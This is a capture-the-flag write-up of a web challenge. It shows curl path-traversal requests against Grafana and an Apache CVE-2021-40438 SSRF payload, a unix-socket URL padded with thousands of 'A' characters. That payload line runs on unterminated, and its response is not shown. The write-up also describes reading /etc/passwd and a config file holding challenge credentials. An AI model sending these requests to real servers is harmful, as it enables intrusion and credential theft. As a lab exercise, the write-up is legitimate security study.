## Analysis
Hrm. No description?? Time to look at the title and guess XD

From the given challenge link to a website, we are first presented with a login page to a Grafana instance.

![Grafana Login Page](./images//grapache_0.png)

```bash
$ curl -I http://challs.nusgreyhats.org:12321/login
HTTP/1.1 302 Found
Date: Sat, 11 Jun 2022 16:52:33 GMT
Server: Apache/2.4.47 (Unix)

```
After inspecting the server payload with `curl`, we see that this is an instance of Grafana 8.1.0 running on Apache 2.4.47

Poking around with different generic paths (e.g. /flag) weren't successful and the credentials used to login could not be found.

Seeing how there is a prompt to update to the latest version, the first thing that came to mind was that there could be a possible vulnerbility in the software at that version.

All we needed to do is to search for Grafana CVEs, and [Mitre](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=grafana) has a good list of them.

We can then narrow down the search to an unauthenticated attack on the page (since obviously we don't have any valid credentials)

What really stood out was [CVE-2021-43813](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43813), since it had a more common CTF web theme of LFI.

# Solution?
After digging around for some proof-of-concepts (PoC), we find a good rundown of how the exploit was found [here](https://labs.detectify.com/2021/12/15/zero-day-path-traversal-grafana/).

Now, we could just simply access some arbituary file on the system?

```bash
curl -i --path-as-is http://challs.nusgreyhats.org:12321/public/plugins/mysql/../../../../VERSION
HTTP/1.1 302 Found
Date: Sat, 11 Jun 2022 17:00:05 GMT

<a href="/login">Found</a>.
```

```bash
$ curl -i --path-as-is http://challs.nusgreyhats.org:12321/public/plugins/mysql/../../../../../VERSION
HTTP/1.1 400 Bad Request
Date: Sat, 11 Jun 2022 17:11:46 GMT
Server: Apache/2.4.47 (Unix)
Content-Length: 226
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>

<p>Your browser sent a request that this server could not understand.<br />
</p>
</body></html>

```

Nope :C. Didn't appear to work sadly. We also notice that now we are being redirected to `/VERSION` despite having more `../` than subdirectories in the URL.

That means something must have been pre-processing the URL before forwarding it to the Graphana instance.

Who else could the culprit be? Apache. Of course.

Seeing how that Apache parses the URL and prevents directory traversal if the path exceeds the root dir, there was no way to get path traversal working.

Trying encoding and other types of ways to bypass detection, did not seem to work as Grafana does not parse them correctly as intended (shown below on a local instance)

```bash
$ curl -i --path-as-is http://localhost/public/plugins/mysql/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fVERSION
HTTP/1.1 404 Not Found
Date: Sat, 11 Jun 2022 17:06:54 GMT
Server: Apache/2.4.48 (Unix)
Content-Length: 196
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>

```

Even for requests that made it through, the Grafana instance logs were not looking too good.

```
INFO[06-07|01:08:39] Request Completed                        logger=context userId=0 orgId=0 uname= method=GET path=/public/plugins/mysql/..%2f..%2f..%2f..%2f..%2fVERSION status=404 remote_addr=::1 time_ms=0 size=35 referer=
```

Clearly the path was not resolving correct, compared to the actual one (directly to the local instance) which gives an error if file not found

```bash
$ curl -i --path-as-is http://localhost:3000/public/plugins/mysql/../../../../../../VERSION

```

```

## Apa-head-ache
Going back to look for [Apache CVEs](https://httpd.apache.org/security/vulnerabilities_24.html) for the particular Apache version, we find a few interesting ones on the list being CVE-2022-26377, CVE-2022-22720, CVE-2021-41773 and CVE-2021-40438.

[CVE-2022-26377](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-26377) was about Possible request smuggling, but there was no public proof-of-concept possible, leaving it to be quite an obsecure CVE. Same thing goes for CVE-2022-22720.

[CVE-2021-41773](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773) seemed likely, but we realised that it only affected the cgi-bin or any Apache handled directory. Unfortunately checking the `httpd.conf` provided later as hints revealed that the proxy was mounted on `/`.

```conf
<VirtualHost *>
        ServerAdmin webmaster@localhost
        DocumentRoot "/usr/local/apache2/htdocs"
        ServerName grapache.websec.pw
        LogLevel notice proxy:trace8
        ErrorLog /proc/self/fd/2
        CustomLog /proc/self/fd/1 combined
        ProxyPass / "http://grapache_grafana:3000/"
        ProxyPassReverse / "http://grapache_grafana:3000/"
</VirtualHost>
```

That only leaves us with [CVE-2021-40438](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-40438). Searching for PoCs landed us with https://github.com/sixpacksecurity/CVE-2021-40438.

Woohoo!

# Solution
The Apache CVE allowed us to perform either SSRF or RCE depending how it was used, and we decided to just follow what they tried in the Github POC (so SSRF instead).

Looking at the Apache `httpd.conf` will lead us to the local address of the Grafana instance:

Crafting a malicious unix socket payload allows direct redirection of the request to a different server from Apache, and we only needed to connect to the local address of Grafana and find the interesting files.

Full payload and response: 
```bash
$ curl -i --path-as-is "http://challs.nusgreyhats.org:12321/?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Trying out the payload we were able to get the `VERSION` as well as `/etc/passwd`. Unfortunately the flag was nowhere to be found.

The hints provided were of great benefit, telling us that there was a `grafana.ini` file uploaded. We would just need to obtain that and see what we have.

After retrieving and opening the config file, we immediately see the credentials for the web service available for us.

```ini
[security]
# disable creation of admin user on first start of grafana
;disable_initial_admin_creation = false

# default admin user, created on startup
admin_user = grey_user

# default admin password, can be changed before first start of grafana,  or in profile settings
admin_password = grey_passsssssss

# used for signing
secret_key = SW2YcwTIb9zpOOhoPsMoiID9fd
```

Hoho! That was where time was wasted when we thought the flag would be on the instance (wasted a good few minutes).

Apparently, the flag was in `grafana.ini` all along, but commented so it was hard to see.

**Flag:** ```grey{55rf_w17h_vuln_4p4ch3_847cc276557e198b}```

## Notes/Takeaways
- Finding the 2 CVEs (especially the apache one) was the hard part, after that it was just the matter of finding the correct payload and solving
- The hints for the challenge seemed rather essential for some parts, without it definitely would have been slighter more challenging and clueless, next time should just include, thanks admins!
- Very sneaky of the author to hide the flag in the config, what caught the eye first was the credentials to log in to the instance
